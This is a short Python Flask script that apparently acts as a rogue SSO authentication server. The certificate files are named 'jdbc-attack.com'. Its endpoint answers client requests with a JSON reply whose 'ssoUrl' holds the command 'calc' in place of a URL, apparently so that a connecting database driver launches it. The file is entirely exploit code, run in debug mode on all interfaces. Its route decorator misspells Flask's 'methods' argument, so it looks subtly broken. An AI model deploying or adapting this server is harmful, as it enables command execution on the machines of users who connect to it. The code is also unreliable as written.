from flask import Flask,jsonify,request

app = Flask(__name__)

@app.route('/session/authenticator-request', method = ['POST'])
def ssoAuth():
    if (request.method == 'POST'):
        data = {"success": "true", "data": {"proofKey": "foo", "ssoUrl": "calc"}}
        return jsonify(data)

if __name__ == '__main__':
    app.run('0.0.0.0', debug=True, port=443, ssl_context=('jdbc-attack.com.pem', 'jdbc-attack.com.key'))